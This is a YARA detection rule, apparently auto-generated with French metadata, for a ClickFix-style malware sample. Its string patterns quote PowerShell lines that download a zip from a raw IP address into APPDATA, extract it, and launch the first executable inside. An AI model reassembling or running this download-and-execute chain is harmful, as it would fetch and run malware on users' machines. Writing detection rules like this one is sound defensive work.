rule MULTI_Sample_Unique_9cb3b72c
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (inconnu, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "9cb3b72cbc020d4d2f92d668a58c2bf3bc04555f686b1d22467f0384d02836e0"
        yarahub_uuid = "fb4695aa-da79-49ba-a0f8-937f0299cd26"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "inconnu"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "cbad6c06cdd34ddf68df4ae2ff101e92"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "wc = New-Object System.Net.WebClient" ascii
        $s1 = "wc.DownloadFile('http://86.109.75.161:8081/clickfix/lin1948WEx/file', \"$p\\c.zip\")" ascii
        $s2 = "Expand-Archive \"$p\\c.zip\" \"$p\\c\" -Force" ascii
        $s3 = "Remove-Item \"$p\\c.zip\"" ascii
        $s4 = "exe = Get-ChildItem \"$p\\c\" -Recurse -Filter \"*.exe\" | Select-Object -First 1" ascii
        $s5 = "if ($exe) { Start-Process $exe.FullName }" ascii
        $s6 = "p = $env:APPDATA" ascii
    condition:
        true and filesize < 50MB and 3 of ($s0, $s2, $s3, $s4, $s5, $s6) and 1 of ($s1)
}
